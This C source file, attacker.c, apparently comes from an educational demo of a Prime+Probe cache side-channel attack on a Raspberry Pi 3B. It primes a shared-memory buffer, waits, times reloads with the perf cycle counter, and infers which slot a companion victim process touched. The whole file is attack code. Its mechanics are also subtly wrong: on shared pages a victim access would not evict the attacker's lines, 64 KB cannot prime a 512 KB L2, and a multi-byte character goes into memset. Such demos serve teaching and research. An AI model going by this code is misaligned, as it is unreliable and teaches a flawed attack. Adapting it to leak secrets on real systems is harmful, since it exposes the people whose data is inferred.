/*
 * attacker.c  –  Prime+Probe Demo  (Raspberry Pi 3B, ARMv8 / Cortex-A53)
 *
 * ROLE
 * ----
 * This process implements the three phases of a Prime+Probe attack:
 *
 *   PRIME  – Fill every L2 cache set that overlaps our spy buffer with our
 *             own data, evicting whatever was there before.
 *
 *   WAIT   – Give the victim process time to execute its secret-dependent
 *             memory access, which will evict some of our primed lines.
 *
 *   PROBE  – Re-read every cache line in our spy buffer and measure the
 *             access time.  Lines the victim touched will be SLOW (cache
 *             miss → DRAM); lines it did not touch will be FAST (still in
 *             cache → hit).
 *
 * The pattern of slow/fast sets reveals which memory slot the victim
 * accessed, which directly encodes the SECRET value.
 *
 * TIMING SOURCE
 * -------------
 * We use perf_event_open(PERF_COUNT_HW_CPU_CYCLES) to read the Cortex-A53
 * hardware cycle counter from user space.  This is the most accurate timer
 * available; it is enabled because:
 *   • PMU driver "armv8_cortex_a53" is loaded (confirmed from dmesg)
 *   • /proc/sys/kernel/perf_event_paranoid == 1  (allows user access)
 *
 * CACHE GEOMETRY (Pi 3B, Cortex-A53)
 * ------------------------------------
 *  L2: 512 KB, 16-way set-associative, 64-byte lines
 *  Number of L2 sets = 512 KB / (16 ways × 64 B) = 512 sets
 *
 * SHARED-MEMORY LAYOUT  (matches victim.c exactly)
 * ----------------------
 *  16 slots × 4096 bytes = 64 KB
 *  Slot N starts at offset N × 4096.
 *  Each 4-KB slot maps to a contiguous group of L2 cache sets.
 *
 * HOW SLOT → CACHE SET MAPPING WORKS
 * ------------------------------------
 * The L2 set index is determined by bits [14:6] of the physical address
 * (9 bits → 512 sets).  Because POSIX shared memory uses the same physical
 * pages in both processes, the attacker's virtual addresses for each slot
 * map to the exact same L2 sets as the victim's.  We exploit this.
 */

#define _GNU_SOURCE
#include <stdio.h>
#include <stdlib.h>
#include <stdint.h>
#include <string.h>
#include <unistd.h>
#include <fcntl.h>
#include <sys/mman.h>
#include <sys/stat.h>
#include <sys/syscall.h>
#include <sys/ioctl.h>
#include <linux/perf_event.h>
#include <time.h>
#include <signal.h>
#include <errno.h>

/* ── tunables  (must match victim.c) ───────────────────────────────────── */

#define SHM_NAME        "/pp_demo_shm"
#define NUM_SECRETS     16
#define SLOT_SIZE       4096
#define TOTAL_SHM_SIZE  (NUM_SECRETS * SLOT_SIZE)

/* ── attack-specific tunables ──────────────────────────────────────────── */

/*
 * CACHE LINE SIZE in bytes (Cortex-A53 = 64 bytes).
 * We stride through memory in steps of this size so every read brings in
 * exactly one new cache line.
 */
#define CACHE_LINE      64

/*
 * PROBE THRESHOLD (cycles).
 * Accesses below this cycle count are classified as cache HITs (fast,
 * attacker's data still in cache → victim did NOT touch this slot).
 * Accesses above are classified as cache MISSes (slow, victim evicted our
 * data → victim DID touch this slot).
 *
 * Calibration guide for Cortex-A53 @ 1.2 GHz:
 *   L1-D hit  ≈  4  cycles
 *   L2 hit    ≈ 20  cycles
 *   DRAM miss ≈ 200-350 cycles
 * We set the threshold between L2-hit and DRAM-miss.
 */
#define MISS_THRESHOLD  100

/*
 * How long to wait between PRIME and PROBE (microseconds).
 * Must be long enough for the victim to execute its memory access but short
 * enough that the OS scheduler doesn't flush our primed data.
 * 50 ms is a comfortable window given the victim sleeps 100 ms between accesses.
 */
#define WAIT_US         50000   /* 50 ms */

/* Number of attack iterations to average over */
#define NUM_ITERATIONS  200

/* ── perf_event_open wrapper ────────────────────────────────────────────── */

/*
 * perf_event_open is a raw syscall; glibc does not wrap it.
 * We call it directly via syscall(2).
 *
 * Arguments:
 *   hw_event  – struct describing which counter to open
 *   pid       – 0 = measure the calling process
 *   cpu       – -1 = any CPU
 *   group_fd  – -1 = standalone counter (no group leader)
 *   flags     – 0 for default behaviour
 */
static long perf_event_open(struct perf_event_attr *hw_event,
                             pid_t pid, int cpu, int group_fd,
                             unsigned long flags)
{
    return syscall(__NR_perf_event_open, hw_event, pid, cpu, group_fd, flags);
}

/*
 * open_cycle_counter
 * ------------------
 * Opens a hardware cycle-count perf event for the calling process.
 * Returns a file descriptor that can be read with read(2) to get the
 * 64-bit cycle count since the last reset.
 *
 * PERF_COUNT_HW_CPU_CYCLES maps to the Cortex-A53 PMCCNTR_EL0 register.
 * With perf_event_paranoid=1 and running as root this always succeeds.
 */
static int open_cycle_counter(void)
{
    struct perf_event_attr pe;
    memset(&pe, 0, sizeof(pe));

    pe.type           = PERF_TYPE_HARDWARE;
    pe.size           = sizeof(pe);
    pe.config         = PERF_COUNT_HW_CPU_CYCLES;
    pe.disabled       = 1;   /* start disabled; we enable/reset manually */
    pe.exclude_kernel = 0;   /* include kernel cycles for accuracy        */
    pe.exclude_hv     = 1;

    int fd = (int)perf_event_open(&pe, 0, -1, -1, 0);
    if (fd == -1) {
        perror("[attacker] perf_event_open");
        fprintf(stderr, "       Ensure perf_event_paranoid <= 1 and you are root.\n");
        exit(1);
    }
    return fd;
}

/*
 * read_cycles
 * -----------
 * Resets then reads the cycle counter fd.
 * ioctl PERF_EVENT_IOC_RESET zeroes the counter.
 * ioctl PERF_EVENT_IOC_ENABLE starts counting.
 * A subsequent read(2) returns the 64-bit count.
 *
 * We reset+enable rather than using relative reads so each measurement
 * is independent of the previous one.
 */
static inline uint64_t read_cycles(int fd)
{
    uint64_t count = 0;
    ioctl(fd, PERF_EVENT_IOC_RESET,  0);
    ioctl(fd, PERF_EVENT_IOC_ENABLE, 0);
    read(fd, &count, sizeof(count));
    ioctl(fd, PERF_EVENT_IOC_DISABLE, 0);
    return count;
}

/* ── core attack primitives ─────────────────────────────────────────────── */

/*
 * prime
 * -----
 * Fills the ENTIRE shared buffer with cache lines owned by the attacker.
 *
 * We read every 64-byte stride across all 16 slots (64 KB total).
 * This brings all relevant L2 sets into a state where they hold attacker
 * data.  Any subsequent victim access to one of these sets will evict
 * the attacker's line and replace it with the victim's data.
 *
 * The inner loop uses a volatile pointer and a compiler barrier to prevent
 * the compiler from eliding the loads (dead-store elimination).
 */
static void prime(volatile uint8_t *shm_base)
{
    for (size_t offset = 0; offset < TOTAL_SHM_SIZE; offset += CACHE_LINE) {
        (void)shm_base[offset];
        __asm__ volatile("" ::: "memory");
    }
    /*
     * DSB (Data Synchronisation Barrier) – ensures all cache-fill operations
     * are globally visible before we start the wait phase.
     * ISB (Instruction Synchronisation Barrier) – flushes the pipeline.
     */
    __asm__ volatile("dsb sy\nisb" ::: "memory");
}

/*
 * probe_slot
 * ----------
 * Measures the time (in CPU cycles) to re-read all cache lines in one slot.
 *
 * If the victim touched this slot during the WAIT phase, its lines were
 * evicted from L2 and the attacker's lines were replaced.  Re-reading them
 * now causes L2 misses → each access goes to DRAM → HIGH cycle count.
 *
 * If the victim did NOT touch this slot, the attacker's lines are still in
 * L2 → each access is an L2 hit → LOW cycle count.
 *
 * Parameters:
 *   shm_base  – start of the mapped shared buffer
 *   slot_idx  – which slot (0-15) to probe
 *   pmu_fd    – perf event fd for cycle counting
 *
 * Returns: total CPU cycles to read all cache lines in the slot.
 */
static uint64_t probe_slot(volatile uint8_t *shm_base, int slot_idx, int pmu_fd)
{
    volatile uint8_t *slot = shm_base + (size_t)slot_idx * SLOT_SIZE;

    /* Start counting cycles */
    ioctl(pmu_fd, PERF_EVENT_IOC_RESET,  0);
    ioctl(pmu_fd, PERF_EVENT_IOC_ENABLE, 0);

    /* Read every cache line in the slot */
    for (size_t offset = 0; offset < SLOT_SIZE; offset += CACHE_LINE) {
        (void)slot[offset];
        __asm__ volatile("" ::: "memory");
    }

    /* Stop counting and read result */
    ioctl(pmu_fd, PERF_EVENT_IOC_DISABLE, 0);
    uint64_t cycles = 0;
    read(pmu_fd, &cycles, sizeof(cycles));

    return cycles;
}

/* ── result accumulation ────────────────────────────────────────────────── */

/*
 * We keep a running sum of probe cycles per slot across NUM_ITERATIONS.
 * At the end we average and pick the slot with the highest average miss count
 * as the inferred secret.
 *
 * Using a sum (not max) makes the inference robust against noise from
 * OS scheduling, cache prefetchers, and unrelated kernel activity.
 */
typedef struct {
    uint64_t cycle_sum;   /* sum of probe cycles across all iterations */
    uint64_t miss_count;  /* how many iterations exceeded MISS_THRESHOLD */
} SlotStats;

/* ── display helpers ─────────────────────────────────────────────────────── */

/*
 * print_bar_chart
 * ---------------
 * Prints a simple ASCII bar chart of average probe latency per slot.
 * The slot with the highest average (most evictions) is highlighted as the
 * inferred secret.
 */
static void print_bar_chart(SlotStats stats[], int n_slots, int inferred)
{
    /* Find max for scaling */
    uint64_t max_avg = 1;
    for (int i = 0; i < n_slots; i++) {
        uint64_t avg = stats[i].cycle_sum / NUM_ITERATIONS;
        if (avg > max_avg) max_avg = avg;
    }

    printf("\n  ┌─────────────────────────────────────────────────────────┐\n");
    printf("  │          Prime+Probe: Average Probe Latency per Slot    │\n");
    printf("  ├──────┬──────────┬───────────────────────────────────────┤\n");
    printf("  │ Slot │ Avg cyc  │ Miss rate                             │\n");
    printf("  ├──────┼──────────┼───────────────────────────────────────┤\n");

    for (int i = 0; i < n_slots; i++) {
        uint64_t avg  = stats[i].cycle_sum / NUM_ITERATIONS;
        uint64_t miss = stats[i].miss_count;
        int bar_len   = (int)((avg * 35) / max_avg);
        char bar[40];
        memset(bar, '█', bar_len);
        bar[bar_len] = '\0';

        printf("  │ %3d  │ %8lu │ %-35s │%s\n",
               i, (unsigned long)avg, bar,
               (i == inferred) ? " ◄ INFERRED SECRET" : "");
    }
    printf("  └──────┴──────────┴───────────────────────────────────────┘\n");
}

/* ── signal handling ─────────────────────────────────────────────────────── */

static volatile int keep_running = 1;
static void handle_sigint(int s) { (void)s; keep_running = 0; }

/* ── main ────────────────────────────────────────────────────────────────── */

int main(void)
{
    printf("╔══════════════════════════════════════════════════════════╗\n");
    printf("║      Prime+Probe Cache Side-Channel Demo (ARMv8)        ║\n");
    printf("║      Target: Raspberry Pi 3B  Cortex-A53  L2 512KB      ║\n");
    printf("╚══════════════════════════════════════════════════════════╝\n\n");

    /* ------------------------------------------------------------------
     * 1.  Open the hardware cycle-count performance counter.
     *     This uses the Cortex-A53 PMU via perf_event_open(2).
     * ------------------------------------------------------------------ */
    printf("[attacker] Opening hardware cycle counter (PMCCNTR_EL0 via perf) …\n");
    int pmu_fd = open_cycle_counter();
    printf("[attacker] PMU fd=%d  OK\n", pmu_fd);

    /* ------------------------------------------------------------------
     * 2.  Open the shared-memory object created by the victim.
     *     We open with O_RDWR so we can both read (probe) and write (prime).
     *     The victim must have created the shm object first.
     * ------------------------------------------------------------------ */
    printf("[attacker] Opening shared memory '%s' …\n", SHM_NAME);

    int shm_fd = -1;
    /* Retry for up to 10 seconds in case victim hasn't started yet */
    for (int attempt = 0; attempt < 100 && shm_fd == -1; attempt++) {
        shm_fd = shm_open(SHM_NAME, O_RDWR, 0);
        if (shm_fd == -1) {
            if (attempt == 0)
                printf("[attacker] Waiting for victim to create shm");
            printf(".");
            fflush(stdout);
            usleep(100000);   /* 100 ms */
        }
    }
    if (shm_fd == -1) {
        fprintf(stderr, "\n[attacker] Could not open shm after 10 s. Is victim running?\n");
        return 1;
    }
    printf("\n[attacker] Shared memory opened  fd=%d\n", shm_fd);

    /* ------------------------------------------------------------------
     * 3.  Map the shared memory.
     *     MAP_SHARED is critical: it maps the SAME physical pages as the
     *     victim, so we spy on the exact same L2 cache sets.
     * ------------------------------------------------------------------ */
    volatile uint8_t *shm_base = mmap(NULL, TOTAL_SHM_SIZE,
                                      PROT_READ | PROT_WRITE,
                                      MAP_SHARED, shm_fd, 0);
    if (shm_base == MAP_FAILED) { perror("[attacker] mmap"); return 1; }

    printf("[attacker] Shared memory mapped at %p\n\n", (void *)shm_base);
    printf("[attacker] Attack parameters:\n");
    printf("           Slots        : %d  (secret range 0-%d)\n",
           NUM_SECRETS, NUM_SECRETS - 1);
    printf("           Slot size    : %d bytes\n", SLOT_SIZE);
    printf("           Miss thresh  : %d cycles\n", MISS_THRESHOLD);
    printf("           Wait (prime→probe): %d µs\n", WAIT_US);
    printf("           Iterations   : %d\n\n", NUM_ITERATIONS);

    /* ------------------------------------------------------------------
     * 4.  Allocate accumulators for statistics.
     * ------------------------------------------------------------------ */
    SlotStats stats[NUM_SECRETS];
    memset(stats, 0, sizeof(stats));

    signal(SIGINT, handle_sigint);

    /* ------------------------------------------------------------------
     * 5.  Main attack loop.
     *
     *     Each iteration performs one full Prime+Wait+Probe cycle.
     *
     *     ┌──────────────────────────────────────────────────────┐
     *     │  PRIME  →  fill all L2 sets with attacker data       │
     *     │  WAIT   →  victim runs and evicts one slot's sets     │
     *     │  PROBE  →  measure reload time per slot               │
     *     │  INFER  →  slow slot = secret                         │
     *     └──────────────────────────────────────────────────────┘
     * ------------------------------------------------------------------ */
    printf("[attacker] Starting attack  (Ctrl-C to stop early) …\n\n");

    int iter;
    for (iter = 0; iter < NUM_ITERATIONS && keep_running; iter++) {

        /* ── PHASE 1: PRIME ──────────────────────────────────────────
         *
         * Load all cache lines of the shared buffer into L2.
         * After this, the attacker "owns" all relevant L2 cache sets.
         * The victim's previous data (if any) is evicted.
         */
        prime(shm_base);

        /* ── PHASE 2: WAIT ───────────────────────────────────────────
         *
         * Sleep long enough for the victim to wake up, access its
         * secret-derived memory slot, and go back to sleep.
         *
         * During this window the victim's touch evicts attacker lines
         * from the cache sets that correspond to the victim's slot.
         *
         * We use sched_yield() first to voluntarily give up the CPU,
         * increasing the chance the victim runs during our sleep.
         */
        sched_yield();
        usleep(WAIT_US);

        /* ── PHASE 3: PROBE ──────────────────────────────────────────
         *
         * Re-read each slot and measure how long it takes.
         *
         * Fast (< MISS_THRESHOLD cycles) → cache hit  → victim did NOT touch it
         * Slow (≥ MISS_THRESHOLD cycles) → cache miss → victim DID touch it
         */
        for (int s = 0; s < NUM_SECRETS; s++) {
            uint64_t cycles = probe_slot(shm_base, s, pmu_fd);
            stats[s].cycle_sum += cycles;
            if (cycles >= MISS_THRESHOLD)
                stats[s].miss_count++;
        }

        /* Progress indicator every 20 iterations */
        if (iter % 20 == 0) {
            printf("[attacker] iter %3d/%d complete …\n",
                   iter + 1, NUM_ITERATIONS);
            fflush(stdout);
        }
    }

    /* ------------------------------------------------------------------
     * 6.  Infer the secret.
     *
     *     The slot with the highest average probe latency (most cache misses)
     *     is the one the victim touched most often → that is the secret.
     *
     *     We use miss_count rather than raw cycle_sum because it is less
     *     sensitive to outlier iterations caused by OS interrupts.
     * ------------------------------------------------------------------ */
    int    inferred_secret = 0;
    uint64_t max_miss = 0;
    for (int s = 0; s < NUM_SECRETS; s++) {
        if (stats[s].miss_count > max_miss) {
            max_miss = stats[s].miss_count;
            inferred_secret = s;
        }
    }

    /* ------------------------------------------------------------------
     * 7.  Display results.
     * ------------------------------------------------------------------ */
    printf("\n══════════════════════════════════════════════════════════\n");
    printf("  RESULTS after %d iterations\n", iter);
    printf("══════════════════════════════════════════════════════════\n");

    print_bar_chart(stats, NUM_SECRETS, inferred_secret);

    printf("\n  Detailed miss counts:\n  ");
    for (int s = 0; s < NUM_SECRETS; s++) {
        printf("[%2d]=%3lu  ", s, (unsigned long)stats[s].miss_count);
        if ((s + 1) % 4 == 0) printf("\n  ");
    }

    printf("\n");
    printf("  ╔══════════════════════════════════════════╗\n");
    printf("  ║  INFERRED SECRET : %-3d  (miss rate %3lu%%) ║\n",
           inferred_secret,
           (unsigned long)(max_miss * 100 / (uint64_t)iter));
    printf("  ╚══════════════════════════════════════════╝\n\n");

    /* ------------------------------------------------------------------
     * 8.  Cleanup.
     * ------------------------------------------------------------------ */
    munmap((void *)shm_base, TOTAL_SHM_SIZE);
    close(shm_fd);
    close(pmu_fd);
    /* Remove the shm object from the filesystem namespace */
    shm_unlink(SHM_NAME);
    printf("[attacker] Done. Shared memory unlinked.\n");
    return 0;
}
